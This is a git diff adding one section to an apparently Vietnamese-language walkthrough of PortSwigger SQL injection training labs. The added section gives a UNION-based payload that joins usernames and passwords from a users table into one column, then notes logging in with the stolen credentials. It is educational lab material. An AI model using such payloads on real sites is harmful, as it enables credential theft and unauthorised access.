@@ -40,6 +40,14 @@ author: ['default']
 ![image](https://user-images.githubusercontent.com/61643034/209432735-55ce8a1f-04e6-4e5b-8a47-04a90503dbaf.png)
  
  -> Click vào trang login -> nhập username và password và -> done
+ 
+ **[3.4.SQL injection UNION attack, retrieving multiple values in a single column](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column)**
+
+- Tương tự 3.3,thử payload ```'+UNION+SELECT+NULL,username||'~'||password+FROM+users--``` 
+![image](https://user-images.githubusercontent.com/61643034/209439384-7f5fc4e3-81c4-4312-8821-80c683513ebf.png)
+
+ 
+ -> Click vào trang login -> nhập username và password và -> done
 
 # [4.SQL injection with filter bypass via XML encoding](https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding)
 ![image](https://user-images.githubusercontent.com/61643034/209040423-3270052e-3a07-4225-9431-70a5c5d6b9cc.png)
